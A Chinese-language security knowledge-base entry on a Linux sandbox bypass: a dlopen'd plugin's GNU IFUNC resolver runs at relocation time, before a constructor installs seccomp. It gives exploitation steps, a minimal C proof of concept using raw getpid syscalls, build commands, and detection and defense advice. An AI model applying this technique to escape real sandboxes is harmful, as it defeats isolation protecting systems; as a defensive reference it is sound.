---
id: binary-pwn-sandbox-escape-ifunc-resolver-before-constructor-seccomp
title: GNU IFUNC resolver 先于 constructor 执行：绕过插件 constructor 安装的 seccomp
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: ifunc-resolver-seccomp-bypass
tags:
- linux
- elf
- ifunc
- seccomp
- sandbox-escape
- dynamic-linker
- bind-now
- constructor
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V1
  verified_at: '2026-11-04T21:53:48+08:00'
  notes: 已对照原文与 21 张图片核对；原文仅以 getpid 验证时序，推广到任意 syscall 属机制推演，未复跑
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-ifunc-resolver-before-constructor-seccomp/
draft: false
kb_aliases:
- IFUNC 绕过 seccomp
- GNU IFUNC seccomp bypass
- resolver 先于 constructor
- 重定位期代码执行
- STT_GNU_IFUNC 沙箱绕过
- BIND_NOW IFUNC 时序
---

## 一句话结论

把 seccomp 过滤器放在被 `dlopen` 插件的 constructor 里安装时，只要该对象含 GNU IFUNC 且走强制绑定（`BIND_NOW` / `RTLD_NOW` / `LD_BIND_NOW=1`），动态加载器会在重定位阶段先调用 resolver，攻击者代码可在规则生效前执行任意系统调用。

## 原理

ELF 中的 `STT_GNU_IFUNC` 符号不是普通函数地址，而是一个“解析器”入口：动态加载器必须调用 resolver，取得它返回的实现函数地址，再把该地址填入调用点。这个调用发生在重定位处理期间。

`dlopen` 与进程启动的时序是：处理重定位（含调用 IFUNC resolver）→ 执行 `DT_INIT` / `DT_INIT_ARRAY` 即 constructor → 进入 `main`。因此 constructor 永远晚于重定位，而 seccomp 过滤器只约束安装之后发生的系统调用，对已经完成的 resolver 调用没有任何追溯能力。

是否在重定位期调用 resolver 由绑定时机决定：

- 对象带 `DF_BIND_NOW` / `DF_1_NOW`（链接 `-Wl,-z,now`），或宿主用 `RTLD_NOW` 打开，或环境有 `LD_BIND_NOW=1`：resolver 在 `dlopen`/启动重定位时就执行；
- 延迟绑定（`RTLD_LAZY` 且对象无 NOW 标记）：resolver 推迟到首次 PLT 调用，此时 constructor 已装好规则。

关键点是 `RTLD_LAZY` 只是宿主的请求，不能覆盖对象自身的 `DF_BIND_NOW`；同理 `LD_BIND_NOW=1` 不改 ELF 文件也能把 lazy 对象变成启动期解析。

依赖库场景同样成立：主程序依赖的共享库导出 IFUNC 时，库的 resolver 在启动重定位期执行，早于主程序自己的 constructor。

## 触发条件

- 宿主把不受信任的 DSO/插件 `dlopen` 进进程，并依赖该插件的 constructor（或主程序 constructor）安装 seccomp 规则；
- 不受信任对象能定义 `__attribute__((ifunc(...)))` 符号，或攻击者可控制某个带 IFUNC 的依赖库；
- 实际绑定为立即绑定：对象 `BIND_NOW`、宿主 `RTLD_NOW`、或进程环境 `LD_BIND_NOW=1` 任一成立；
- resolver 内使用裸 `syscall` 而不是被 libc 包装/缓存的接口，才能观察到内核真实返回；
- 策略安装点晚于重定位（constructor 或更晚）。

## 利用步骤

1. 确认目标 DSO 存在 IFUNC 导出：`readelf -Ws lib.so | grep IFUNC`；同时能看到 resolver 与实现是不同的符号。
2. 确认调用点：`readelf -rW lib.so | grep -E 'JUMP_SLOT|selected'`，找到引用该 IFUNC 的 `JUMP_SLOT`。
3. 确认绑定时机：`readelf -dW lib.so | grep -E 'BIND_NOW|FLAGS|FLAGS_1'`；再看宿主 `dlopen` 的模式与进程环境中的 `LD_BIND_NOW`。
4. 在 resolver 中放置需要执行的裸系统调用（`SYS_open`、`SYS_read`、`SYS_write`、`SYS_execve` 等），返回实现函数地址；resolver 受 glibc 限制，不应调用 `malloc`、`dlopen`、`dlsym` 等依赖初始化次序的接口。
5. 观察时序：`strace -ff -e trace=<syscall>` 应显示规则安装前有一次成功调用，之后同一实现内的调用返回 `EPERM`。
6. 对照组：把同一 BPF 规则改到宿主 `dlopen` 之前安装，resolver 与实现的调用都变成 `EPERM`，说明绕过点就是安装位置。

## PoC

最小结构（省略 BPF 细节，规则仅拒绝某个系统调用）：

```c
#define _GNU_SOURCE
#include <sys/syscall.h>
#include <unistd.h>

static long raw_syscall(long nr, long a, long b, long c)
{
  long r;
  __asm__ volatile ("syscall" : "=a"(r) : "a"(nr), "D"(a), "S"(b), "d"(c)
                    : "rcx", "r11", "memory");
  return r;
}

static int impl(void) { return (int) raw_syscall(SYS_getpid, 0, 0, 0); }
static int (*resolver(void))(void)
{
  raw_syscall(SYS_getpid, 0, 0, 0);   /* 重定位期执行，早于 constructor */
  return impl;
}
int selected(void) __attribute__((ifunc("resolver")));

__attribute__((constructor)) static void install_filter(void)
{
  /* prctl(PR_SET_NO_NEW_PRIVS,1,...) + seccomp(SECCOMP_SET_MODE_FILTER,...)，
     规则对 SYS_getpid 返回 SECCOMP_RET_ERRNO|EPERM */
}

int call_selected(void) { return selected(); }
```

构建与验证：

```bash
cc -O2 -fPIC -shared -Wl,-z,relro -Wl,-z,now -o libifunc_eager.so ifunc_plugin.c
readelf -Ws libifunc_eager.so | grep -E 'IFUNC|selected'
readelf -dW libifunc_eager.so | grep -E 'BIND_NOW|FLAGS'
# 宿主 dlopen(RTLD_NOW) 后读取 resolver 写入的返回值：
#   resolver 结果 = 真实 PID，constructor 返回值 = 0，实现调用 = -1(EPERM)
# 把同样的规则移到 dlopen 前安装：resolver 与实现都为 -1(EPERM)
```

## 变体与关联

- 加载方式变体：插件 `dlopen` 路径与“主程序依赖库在启动期重定位”路径，机制相同，区别只是触发点是 `dlopen` 还是进程启动。
- 环境变体：不改二进制，仅设置 `LD_BIND_NOW=1` 即可把 lazy 主程序推到与 NOW 版本相同的重定位期解析。
- 常见误判：看到 `RTLD_LAZY` 就认为 resolver 一定晚于 constructor，忽略了对象自身 `DF_BIND_NOW` 仍会强制立即绑定。
- 关联：ELF 重定位与延迟绑定、constructor 执行顺序、seccomp 策略安装点；与“constructor 中建立隔离状态”的插件设计缺陷同类。

## 检测与防御

- 防御的核心是安装位置：生成 BPF 并调用 `PR_SET_NO_NEW_PRIVS`、`SECCOMP_SET_MODE_FILTER` 的代码必须位于宿主首次 `dlopen`（以及加载任何不受信任 DSO）之前。`RTLD_NOW` 改 `RTLD_LAZY` 不是替代方案。
- 不要把安全策略交给插件 constructor；constructor 在执行顺序上晚于重定位，也不应作为隔离边界。
- 若必须加载不受信任代码，放到独立进程/容器中，由父进程在 `exec` 前装好策略，或让子进程在加载前自行降权并安装过滤器。
- 检测：对不受信任 DSO 扫描 `STT_GNU_IFUNC` 符号；审计代码中“在 constructor 内安装 seccomp”的实现；检查启动环境是否设置 `LD_BIND_NOW`；用 `strace` 对比过滤器安装前后同一系统调用的返回值。
- 检测侧限制：只检查插件源码里有没有 constructor 得不出这条顺序，必须同时看 IFUNC 符号、`JUMP_SLOT` 引用和动态绑定标记。
